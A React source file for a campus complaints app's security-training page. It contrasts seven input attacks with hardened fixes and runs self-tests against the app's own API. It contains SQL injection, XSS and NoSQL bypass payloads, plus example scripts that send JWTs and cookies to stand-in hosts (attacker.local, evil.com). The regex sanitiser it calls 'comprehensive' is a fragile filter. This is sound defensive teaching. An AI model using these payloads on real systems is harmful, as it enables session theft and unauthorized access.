import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Code2, 
  AlertTriangle, 
  CheckCircle2, 
  Play, 
  RefreshCw, 
  Lock, 
  FileText,
  Flame,
  Binary,
  Layers,
  Sparkles
} from 'lucide-react';
import { useApp } from '../context/AppContext';

interface TestResult {
  status: number;
  data: any;
  passed: boolean;
  notes: string;
}

export const InputSecurityPage: React.FC = () => {
  const { token, navigate } = useApp();
  const [activeTab, setActiveTab] = useState<number>(1);
  const [runningTest, setRunningTest] = useState<number | null>(null);
  const [testResults, setTestResults] = useState<Record<number, TestResult>>({});

  const vulnerabilities = [
    {
      id: 1,
      title: 'SQL Injection (SQLi)',
      category: 'Database Query Security',
      icon: Terminal,
      vulnerableSnippet: `// ❌ VULNERABLE: Direct string concatenation in SQL query
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
const result = await db.query(query);

// Attack input: ' OR '1'='1' -- 
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1' -- '`,
      whyVulnerable: `String concatenation blends untrusted user-supplied data into the SQL command syntax. The SQL parser cannot distinguish between code meant as SQL instructions and data supplied by the user. When an apostrophe (') is entered, it closes the string literal early, allowing the attacker to inject arbitrary SQL statements (OR '1'='1', UNION SELECT, or DROP TABLE).`,
      localAbuse: `In a controlled local environment: An attacker enters "' OR '1'='1' -- " in the login or search field. Because '1'='1' is always true, the WHERE clause evaluates to true for every single row in the database, returning the first account (usually admin) and granting unauthorized full administrative access without any valid password.`,
      fixedSnippet: `// ✅ SECURE: Parameterized Query (Prepared Statement)
const query = 'SELECT * FROM users WHERE email = $1';
const result = await pool.query(query, [email.trim().toLowerCase()]);

// In PostgreSQL / pg: User input is sent via separate binary protocol buffer, NEVER parsed as SQL syntax.`,
      whyFixWorks: `Parameterized queries separate the query structure from the data parameters. The SQL engine compiles the query blueprint first ('SELECT * FROM users WHERE email = $1') and assigns parameters into distinct placeholders. The database treats the input strictly as literal string values, neutralizing all punctuation, quotes, or SQL keywords.`,
      testDescription: `Sends SQL injection payload "' OR '1'='1' -- " into GET /api/complaints?search=...`,
      testAction: async () => {
        const res = await fetch('/api/complaints?search=' + encodeURIComponent("' OR '1'='1' -- "), {
          headers: token ? { Authorization: `Bearer ${token}` } : {}
        });
        const data = await res.json();
        return {
          status: res.status,
          data,
          passed: res.status === 200 && (!data.data || data.data.length === 0),
          notes: 'Query treated input as a literal search string. Zero unauthorized records were leaked.'
        };
      }
    },
    {
      id: 2,
      title: 'Cross-Site Scripting (XSS)',
      category: 'Script & Markup Injection',
      icon: ShieldAlert,
      vulnerableSnippet: `// ❌ VULNERABLE: Direct HTML injection in DOM
document.getElementById('complaint-title').innerHTML = complaint.title;
// OR in React:
<div dangerouslySetInnerHTML={{ __html: complaint.title }} />

// Attack payload: <img src=x onerror="alert(localStorage.getItem('token'))">`,
      whyVulnerable: `If raw user input containing HTML or JavaScript is rendered without escaping into the browser's Document Object Model, the browser parses the tags as executable script instructions. The attacker's script executes within the victim's session context, with full access to cookies, local storage JWTs, and DOM contents.`,
      localAbuse: `In a controlled local environment: A student enters a complaint with title: "<script>fetch('http://attacker.local/steal?jwt=' + localStorage.getItem('token'))</script>". When a Campus Administrator opens the ticket, the admin's browser runs the script silently in the background, exfiltrating the admin's JWT session token to the attacker.`,
      fixedSnippet: `// ✅ SECURE (Backend): Multi-stage HTML tag stripping & character conversion
export const sanitizeString = (str) => {
  return str
    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')
    .replace(/\\bon\\w+\\s*=\\s*[^>\\s]+/gi, '') // Strips onerror=, onclick=
    .replace(/</g, '&lt;').replace(/>/g, '&gt;');
};

// ✅ SECURE (Frontend): React JSX automatic string interpolation
// React automatically escapes strings inside {complaint.title}, converting < into &lt;
<h1>{complaint.title}</h1>`,
      whyFixWorks: `Backend sanitization strips dangerous tags and active event handlers before persistence. On the client side, standard React JSX interpolation treats all variables as plain text strings, replacing HTML-sensitive characters with safe HTML entities before injecting into the DOM.`,
      testDescription: `Posts a complaint containing <script>alert(1)</script> and <img src=x onerror=alert(2)>.`,
      testAction: async () => {
        const res = await fetch('/api/complaints', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {})
          },
          body: JSON.stringify({
            title: 'Water Leak <script>alert(1)</script>',
            category: 'Campus Infrastructure',
            description: 'Pipe leaking in dorm washroom <img src=x onerror=alert(document.cookie)>',
            location: 'Building C Room 204'
          })
        });
        const data = await res.json();
        const hasScript = data.data?.title?.includes('<script>') || data.data?.description?.includes('onerror=');
        return {
          status: res.status,
          data,
          passed: res.status === 201 && !hasScript,
          notes: 'Script tags stripped and event handlers neutralized before database storage.'
        };
      }
    },
    {
      id: 3,
      title: 'NoSQL Injection (Object & Operator Injection)',
      category: 'Query Selector Security',
      icon: Binary,
      vulnerableSnippet: `// ❌ VULNERABLE: Passing raw object input directly to query engine
// In MongoDB/Mongoose:
const user = await User.findOne({ email: req.body.email, password: req.body.password });

// Attack payload in JSON body:
{ "email": { "$ne": null }, "password": { "$gt": "" } }
// Result: $ne and $gt match any non-empty record, bypassing authentication!`,
      whyVulnerable: `When express.json() parses incoming JSON bodies, a client can submit nested objects instead of simple primitive strings. If these objects contain query operators (e.g. '$gt', '$ne', '$where'), database drivers evaluate them as logical expressions rather than field values, bypassing authentication or dumping database contents.`,
      localAbuse: `In a controlled local environment: An attacker submits POST /api/auth/login with {"email": {"$gt": ""}, "password": {"$gt": ""}}. The query matches the first user in the collection whose password is greater than an empty string, logging in as the first user without knowing any credentials.`,
      fixedSnippet: `// ✅ SECURE (1): Strict primitive type validation
if (typeof email !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Email and password must be strings.' });
}

// ✅ SECURE (2): Recursive operator stripping middleware
for (const [key, value] of Object.entries(data)) {
  if (key.startsWith('$') || key === '__proto__') continue; // Strip operator
  sanitized[key] = sanitizeData(value);
}`,
      whyFixWorks: `Strict type checking ensures only primitive strings ever reach authentication and database query routines. Sanitizer middleware automatically strips any object keys beginning with '$', preventing query selector injections from reaching data layers.`,
      testDescription: `Sends object with nested NoSQL operator keys {"$gt": "", "$ne": null} to /api/security/audit-inspect.`,
      testAction: async () => {
        const res = await fetch('/api/security/audit-inspect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: { '$gt': '', '$ne': null },
            studentId: { '$exists': true }
          })
        });
        const data = await res.json();
        const rawJson = JSON.stringify(data.receivedSanitizedBody || {});
        const hasDollar = rawJson.includes('$');
        return {
          status: res.status,
          data,
          passed: res.status === 200 && !hasDollar,
          notes: 'All object keys prefixed with "$" were safely stripped by the sanitizer pipeline.'
        };
      }
    },
    {
      id: 4,
      title: 'Invalid Input (Format & Boundary Enforcement)',
      category: 'Input Validation',
      icon: AlertTriangle,
      vulnerableSnippet: `// ❌ VULNERABLE: Trusting user input format without server-side validation
app.post('/api/complaints', (req, res) => {
  const { title, category, description } = req.body;
  // No length checks, no category whitelist, no email format checks!
  db.save({ title, category, description });
});`,
      whyVulnerable: `Relying solely on frontend form validation (HTML attributes like 'required' or regex pattern) is meaningless because an attacker can issue raw HTTP requests via cURL or Postman. Without server-side validation, users can store empty strings, fake categories, negative numbers, or invalid email formats that corrupt application state.`,
      localAbuse: `In a controlled local environment: An attacker bypasses HTML5 input constraints and sends a complaint ticket with empty strings or non-existent category 'SuperAdminPrivilege'. This breaks reporting metrics, crashes status dashboards, and causes null reference exceptions across downstream services.`,
      fixedSnippet: `// ✅ SECURE: Whitelist validation & comprehensive boundaries
const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
if (!email || typeof email !== 'string' || !emailRegex.test(email.trim())) {
  errors.push('Please provide a valid email address.');
}
if (!ALLOWED_CATEGORIES.includes(category.trim())) {
  errors.push('Invalid category specified.');
}
if (description.trim().length < 15) {
  errors.push('Description must provide at least 15 characters of detail.');
}`,
      whyFixWorks: `The backend acts as the authoritative gatekeeper. Inputs are checked against strict format regular expressions, minimum/maximum lengths, and enumerated value whitelists before reaching any service logic.`,
      testDescription: `Submits an invalid complaint ticket with title < 5 chars, illegal category, and description < 15 chars.`,
      testAction: async () => {
        const res = await fetch('/api/complaints', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {})
          },
          body: JSON.stringify({
            title: 'bad',
            category: 'NonExistentCategory999',
            description: 'Too short',
            location: ''
          })
        });
        const data = await res.json();
        return {
          status: res.status,
          data,
          passed: res.status === 400 && Array.isArray(data.errors) && data.errors.length >= 3,
          notes: `Server correctly rejected invalid payload with HTTP 400 and returned ${data.errors?.length || 0} validation errors.`
        };
      }
    },
    {
      id: 5,
      title: 'Oversized Input & Resource Exhaustion (DoS)',
      category: 'Denial of Service Prevention',
      icon: Flame,
      vulnerableSnippet: `// ❌ VULNERABLE: Unbounded Express body parsing & unlimited string lengths
app.use(express.json()); // Default accepts large bodies up to 100KB+

app.post('/api/auth/register', async (req, res) => {
  // Bcrypt computation on a 1MB password string locks the Node.js event loop for minutes!
  const hash = await bcrypt.hash(req.body.password, 12);
});`,
      whyVulnerable: `Sending massive JSON payloads (megabytes in size) forces the server to allocate large blocks of V8 heap memory to parse the request body, leading to Heap Out of Memory crashes. Furthermore, computationally intensive operations like bcrypt hashing can freeze the single-threaded Node.js event loop if supplied with oversized passwords.`,
      localAbuse: `In a controlled local environment: An attacker writes a script sending 20 concurrent HTTP requests with a 10MB JSON string or 5,000-character password. The Node event loop completely hangs, CPU spikes to 100%, and the entire application stops responding to all legitimate students.`,
      fixedSnippet: `// ✅ SECURE (1): Explicit Express body parser size limits
app.use(express.json({ limit: '50kb' }));
app.use(express.urlencoded({ extended: true, limit: '50kb' }));

// ✅ SECURE (2): Bcrypt length cap (72 bytes maximum)
if (password.length > 72) {
  return res.status(400).json({ error: 'Password cannot exceed 72 characters.' });
}

// ✅ SECURE (3): Centralized 413 Payload Too Large handler
if (err.type === 'entity.too.large' || err.status === 413) {
  return res.status(413).json({ error: 'Payload Too Large (50KB limit).' });
}`,
      whyFixWorks: `Express terminates parsing immediately when the incoming stream exceeds 50KB, before buffering into memory. Strict field-level length caps on descriptions (2,000 chars) and passwords (72 chars) prevent computational exhaustion.`,
      testDescription: `Transmits an oversized payload exceeding the 50KB limit to test HTTP 413 rejection.`,
      testAction: async () => {
        const hugePayload = {
          title: 'Valid Title Here',
          category: 'Campus Infrastructure',
          description: 'Valid description that has sufficient character count for testing',
          location: 'Main Hall',
          garbage: 'Z'.repeat(60 * 1024) // 60KB
        };
        const res = await fetch('/api/complaints', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {})
          },
          body: JSON.stringify(hugePayload)
        });
        const data = await res.json();
        return {
          status: res.status,
          data,
          passed: res.status === 413,
          notes: 'Server aborted request immediately with HTTP 413 Payload Too Large.'
        };
      }
    },
    {
      id: 6,
      title: 'Malicious HTML & JavaScript (Tag & Event Stripping)',
      category: 'HTML Sanitization',
      icon: Code2,
      vulnerableSnippet: `// ❌ VULNERABLE: Directly storing rich text with embedded <iframe> or javascript: links
const comment = req.body.comment;
await db.query('INSERT INTO comments (message) VALUES ($1)', [comment]);

// Attack input:
// <iframe src="javascript:alert(1)"></iframe>
// <a href="javascript:alert('Hacked')">Click for scholarship</a>`,
      whyVulnerable: `Even when script tags are filtered, attackers can execute JavaScript using pseudo-protocols ('javascript:...'), embedded objects/iframes, or inline event handlers like 'onload', 'onmouseover', and 'onerror'. If these tags are stored and rendered by other users or administrators, arbitrary scripts run.`,
      localAbuse: `In a controlled local environment: A user submits a comment containing a disguised link: '<a href="javascript:fetch(\\'http://evil.com/leak?\\'+document.cookie)">Click here to view receipt</a>'. When an administrator clicks the link, the JavaScript URI executes with full admin session privileges.`,
      fixedSnippet: `// ✅ SECURE: Comprehensive regex cleaning & angle bracket neutralization
export const sanitizeString = (str) => {
  return str
    .replace(/<iframe\\b[^<]*(?:(?!<\\/iframe>)<[^<]*)*<\\/iframe>/gi, '')
    .replace(/javascript:[^"'\\s]*/gi, '')
    .replace(/\\bon\\w+\\s*=\\s*[^>\\s]+/gi, '')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .trim();
};`,
      whyFixWorks: `All executable tags (iframe, object, embed) and pseudo-protocols (javascript:, vbscript:) are purged, and all angle brackets are converted to safe HTML entities (&lt; and &gt;) so they are treated strictly as printable characters.`,
      testDescription: `Posts a comment containing <iframe src="javascript:alert(1)"> and onmouseover handlers.`,
      testAction: async () => {
        const res = await fetch('/api/security/audit-inspect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            comment: 'Important note <iframe src="javascript:alert(1)"></iframe> with <b onmouseover=alert(2)>hover</b>'
          })
        });
        const data = await res.json();
        const sanitized = data.receivedSanitizedBody?.comment || '';
        const containsIframe = sanitized.includes('<iframe') || sanitized.includes('javascript:') || sanitized.includes('onmouseover');
        return {
          status: res.status,
          data,
          passed: res.status === 200 && !containsIframe,
          notes: `Sanitizer neutralized tags: "${sanitized}"`
        };
      }
    },
    {
      id: 7,
      title: 'Unexpected Data Types (Type Juggling & Coercion)',
      category: 'Type Safety & Defense-in-Depth',
      icon: Layers,
      vulnerableSnippet: `// ❌ VULNERABLE: Assuming incoming body fields are always strings
app.post('/api/complaints', (req, res) => {
  const { title } = req.body;
  if (title.length < 5) { // If title is an Array, [1, 2, 3].length === 3!
    return res.status(400).send('Too short');
  }
  // If title is an Object: title.trim() throws TypeError: title.trim is not a function!
  const cleaned = title.trim();
});`,
      whyVulnerable: `JavaScript is dynamically typed, and Express JSON parser deserializes whatever valid JSON the client submits (numbers, booleans, arrays, nested objects). If the backend expects a string but receives an object or array, calling string methods (.trim(), .toLowerCase()) causes unhandled TypeErrors that crash request threads or trigger unexpected logic branches.`,
      localAbuse: `In a controlled local environment: An attacker sends POST /api/complaints with {"title": {"nested": true}}. The server tries to run 'title.trim()', throws an unhandled TypeError, returns an unhandled 500 Internal Server Error, and may leak stack traces revealing backend file paths and library versions.`,
      fixedSnippet: `// ✅ SECURE: Strict runtime data type verification
if (title === undefined || title === null) {
  errors.push('Title is required.');
} else if (typeof title !== 'string') {
  errors.push(\`Invalid data type for "title". Expected string, received \${typeof title}.\`);
} else if (title.trim().length === 0) {
  errors.push('Title cannot be whitespace only.');
}`,
      whyFixWorks: `Every field is strictly checked for 'typeof field === "string"' before any string operations or database insertions occur. Any non-string data types are immediately caught and rejected with HTTP 400 Bad Request.`,
      testDescription: `Submits payload with array for title, number for category, and object for description.`,
      testAction: async () => {
        const res = await fetch('/api/complaints', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {})
          },
          body: JSON.stringify({
            title: ['Array instead of string'],
            category: 12345,
            description: { object: 'instead of string' },
            location: true
          })
        });
        const data = await res.json();
        return {
          status: res.status,
          data,
          passed: res.status === 400 && Array.isArray(data.errors) && data.errors.some((e: string) => e.includes('Invalid data type')),
          notes: `Server cleanly caught all type violations and rejected request: "${data.errors?.[0]}"`
        };
      }
    }
  ];

  const handleRunTest = async (vuln: typeof vulnerabilities[0]) => {
    setRunningTest(vuln.id);
    try {
      const result = await vuln.testAction();
      setTestResults(prev => ({
        ...prev,
        [vuln.id]: result
      }));
    } catch (err: any) {
      setTestResults(prev => ({
        ...prev,
        [vuln.id]: {
          status: 500,
          data: { error: err.message },
          passed: false,
          notes: 'Test network error or server connection refused.'
        }
      }));
    } finally {
      setRunningTest(null);
    }
  };

  const currentVuln = vulnerabilities.find(v => v.id === activeTab) || vulnerabilities[0];

  return (
    <div className="space-y-8 pb-16">
      {/* Header Banner */}
      <div className="bg-white rounded-2xl border border-slate-200 p-6 sm:p-8 shadow-sm">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-indigo-600 mb-1">
              <Lock className="w-5 h-5" />
              <span className="text-xs font-bold uppercase tracking-wider">Level 6 Security Architecture</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">
              Input Security &amp; Attack Mitigation Suite
            </h1>
            <p className="mt-1 text-sm text-slate-600 max-w-3xl">
              Audit, understand, and defend against the top 7 malicious input attack vectors. Inspect vulnerable code patterns, parameterized query defenses, and execute live attack simulations against the backend.
            </p>
          </div>
          <button
            onClick={() => navigate('student-dashboard')}
            className="self-start sm:self-auto px-4 py-2 text-xs font-semibold rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 transition-colors"
          >
            ← Back to Dashboard
          </button>
        </div>
      </div>

      {/* Critical Concept Callout: SQL Query Concatenation vs. Parameterized Queries */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="bg-rose-50/80 rounded-2xl border border-rose-200 p-6 shadow-sm">
          <div className="flex items-center gap-2 text-rose-800 font-bold text-sm mb-2">
            <Flame className="w-4 h-4 text-rose-600" />
            <span>Why String Concatenation in SQL is Dangerous</span>
          </div>
          <p className="text-xs text-rose-900/90 leading-relaxed mb-3">
            Constructing SQL queries via string concatenation such as:
          </p>
          <div className="bg-rose-950 text-rose-200 font-mono text-xs p-3 rounded-lg border border-rose-900/50 mb-3 overflow-x-auto">
            "SELECT * FROM users WHERE email = '" + email + "'"
          </div>
          <p className="text-xs text-rose-900/90 leading-relaxed">
            is catastrophically dangerous because the database engine parses the combined string as raw syntax instructions. An input containing quotes or comment dashes alters the query’s Boolean logic tree or appends destructive commands (e.g. <code className="bg-rose-200/60 px-1 py-0.5 rounded text-rose-950 font-mono">; DROP TABLE users; --</code>).
          </p>
        </div>

        <div className="bg-emerald-50/80 rounded-2xl border border-emerald-200 p-6 shadow-sm">
          <div className="flex items-center gap-2 text-emerald-800 font-bold text-sm mb-2">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>How Parameterized Queries Neutralize SQL Injection</span>
          </div>
          <p className="text-xs text-emerald-900/90 leading-relaxed mb-3">
            In contrast, parameterized queries (prepared statements) separate code from data:
          </p>
          <div className="bg-emerald-950 text-emerald-200 font-mono text-xs p-3 rounded-lg border border-emerald-900/50 mb-3 overflow-x-auto">
            pool.query('SELECT * FROM users WHERE email = $1', [email]);
          </div>
          <p className="text-xs text-emerald-900/90 leading-relaxed">
            The SQL structure is pre-compiled by the database parser. User input is transmitted as inert literal parameter data over the wire protocol, making it mathematically impossible for input to be interpreted as executable SQL commands.
          </p>
        </div>
      </div>

      {/* React XSS & dangerouslySetInnerHTML Explainer */}
      <div className="bg-indigo-50/70 border border-indigo-200 rounded-2xl p-6 shadow-sm space-y-3">
        <div className="flex items-center gap-2 text-indigo-900 font-bold text-sm">
          <Sparkles className="w-4 h-4 text-indigo-600" />
          <span>React's Built-in XSS Protection &amp; The Danger of dangerouslySetInnerHTML</span>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs text-slate-700">
          <div className="bg-white/80 p-4 rounded-xl border border-indigo-100">
            <h4 className="font-bold text-slate-900 mb-1">How React Protects by Default</h4>
            <p className="leading-relaxed">
              When you write <code className="bg-slate-100 px-1 py-0.5 rounded font-mono text-indigo-700">&lt;p&gt;&#123;complaint.title&#125;&lt;/p&gt;</code>, React automatically escapes all string contents before rendering into the DOM. Characters like <code className="font-mono">&lt;</code>, <code className="font-mono">&gt;</code>, and <code className="font-mono">&amp;</code> are converted to inert HTML entities, completely preventing injected <code className="font-mono">&lt;script&gt;</code> tags from executing.
            </p>
          </div>
          <div className="bg-white/80 p-4 rounded-xl border border-rose-100">
            <h4 className="font-bold text-rose-900 mb-1">Why dangerouslySetInnerHTML is Dangerous</h4>
            <p className="leading-relaxed">
              Using <code className="bg-rose-50 px-1 py-0.5 rounded font-mono text-rose-700">dangerouslySetInnerHTML=&#123;&#123; __html: userInput &#125;&#125;</code> explicitly tells React to bypass all built-in escaping mechanisms. If unsterilized user input is rendered with this prop, any attacker-controlled <code className="font-mono">&lt;img onerror=...&gt;</code> executes immediately, stealing user sessions.
            </p>
          </div>
        </div>
      </div>

      {/* Vulnerability Tabs */}
      <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
        <div className="flex border-b border-slate-200 overflow-x-auto bg-slate-50/60 p-2 gap-1.5 scrollbar-thin">
          {vulnerabilities.map((v) => {
            const Icon = v.icon;
            const isSelected = activeTab === v.id;
            return (
              <button
                key={v.id}
                onClick={() => setActiveTab(v.id)}
                className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-semibold whitespace-nowrap transition-all ${
                  isSelected
                    ? 'bg-white text-indigo-700 shadow-sm border border-slate-200/80'
                    : 'text-slate-600 hover:text-slate-900 hover:bg-slate-100'
                }`}
              >
                <Icon className={`w-3.5 h-3.5 ${isSelected ? 'text-indigo-600' : 'text-slate-400'}`} />
                <span>{v.id}. {v.title}</span>
              </button>
            );
          })}
        </div>

        {/* Selected Vulnerability Deep Dive */}
        <div className="p-6 sm:p-8 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-100">
            <div>
              <span className="text-[11px] font-bold uppercase tracking-wider text-indigo-600">
                Category: {currentVuln.category}
              </span>
              <h2 className="text-xl font-bold text-slate-900">
                {currentVuln.id}. {currentVuln.title}
              </h2>
            </div>
            <button
              onClick={() => handleRunTest(currentVuln)}
              disabled={runningTest === currentVuln.id}
              className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 text-white text-xs font-semibold rounded-xl shadow-sm flex items-center gap-2 transition-colors self-start sm:self-auto"
            >
              {runningTest === currentVuln.id ? (
                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
              ) : (
                <Play className="w-3.5 h-3.5 fill-current" />
              )}
              <span>{runningTest === currentVuln.id ? 'Testing Live API...' : 'Run Live Attack Simulation'}</span>
            </button>
          </div>

          {/* Section A: Vulnerable Example */}
          <div>
            <h3 className="text-xs font-bold uppercase tracking-wider text-rose-700 mb-2 flex items-center gap-1.5">
              <Flame className="w-3.5 h-3.5 text-rose-600" />
              <span>A. Vulnerable Implementation Example</span>
            </h3>
            <pre className="bg-slate-950 text-slate-200 text-xs font-mono p-4 rounded-xl overflow-x-auto border border-slate-800 leading-relaxed">
              {currentVuln.vulnerableSnippet}
            </pre>
          </div>

          {/* Section B & C: Why Vulnerable & Controlled Local Abuse */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-slate-50 border border-slate-200 p-4 rounded-xl">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-800 mb-1.5 flex items-center gap-1.5">
                <AlertTriangle className="w-3.5 h-3.5 text-amber-600" />
                <span>B. Why It Is Vulnerable</span>
              </h3>
              <p className="text-xs text-slate-600 leading-relaxed">
                {currentVuln.whyVulnerable}
              </p>
            </div>

            <div className="bg-amber-50/60 border border-amber-200 p-4 rounded-xl">
              <h3 className="text-xs font-bold uppercase tracking-wider text-amber-900 mb-1.5 flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5 text-amber-700" />
                <span>C. Controlled Local Environment Abuse</span>
              </h3>
              <p className="text-xs text-amber-950 leading-relaxed">
                {currentVuln.localAbuse}
              </p>
            </div>
          </div>

          {/* Section D: Fixed Code */}
          <div>
            <h3 className="text-xs font-bold uppercase tracking-wider text-emerald-700 mb-2 flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
              <span>D. Hardened &amp; Fixed Implementation</span>
            </h3>
            <pre className="bg-slate-950 text-emerald-300 text-xs font-mono p-4 rounded-xl overflow-x-auto border border-slate-800 leading-relaxed">
              {currentVuln.fixedSnippet}
            </pre>
          </div>

          {/* Section E: Why Fix Works */}
          <div className="bg-emerald-50/60 border border-emerald-200 p-4 rounded-xl">
            <h3 className="text-xs font-bold uppercase tracking-wider text-emerald-900 mb-1.5 flex items-center gap-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />
              <span>E. Why the Fix Works</span>
            </h3>
            <p className="text-xs text-emerald-950 leading-relaxed">
              {currentVuln.whyFixWorks}
            </p>
          </div>

          {/* Section F: Live Test Case & Output */}
          <div className="border-t border-slate-200 pt-6 space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-900 flex items-center gap-1.5">
                <FileText className="w-3.5 h-3.5 text-indigo-600" />
                <span>F. Verification Test Case</span>
              </h3>
              <span className="text-[11px] text-slate-500 font-mono">
                {currentVuln.testDescription}
              </span>
            </div>

            {testResults[currentVuln.id] ? (
              <div className="bg-slate-900 text-slate-100 rounded-xl p-4 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className={`px-2 py-0.5 rounded text-[11px] font-bold font-mono ${
                      testResults[currentVuln.id].passed ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                    }`}>
                      {testResults[currentVuln.id].passed ? 'PASSED (DEFENDED)' : 'ATTACK UNBLOCKED'}
                    </span>
                    <span className="text-xs font-mono text-slate-400">
                      HTTP Status: {testResults[currentVuln.id].status}
                    </span>
                  </div>
                  <span className="text-[11px] text-slate-400">
                    {testResults[currentVuln.id].notes}
                  </span>
                </div>
                <div className="bg-slate-950 rounded-lg p-3 font-mono text-[11px] text-slate-300 max-h-48 overflow-y-auto">
                  {JSON.stringify(testResults[currentVuln.id].data, null, 2)}
                </div>
              </div>
            ) : (
              <div className="bg-slate-50 rounded-xl p-4 border border-dashed border-slate-300 text-center text-xs text-slate-500 flex flex-col items-center justify-center gap-2 py-6">
                <span>Click "Run Live Attack Simulation" above to execute this payload against the server and inspect the response.</span>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
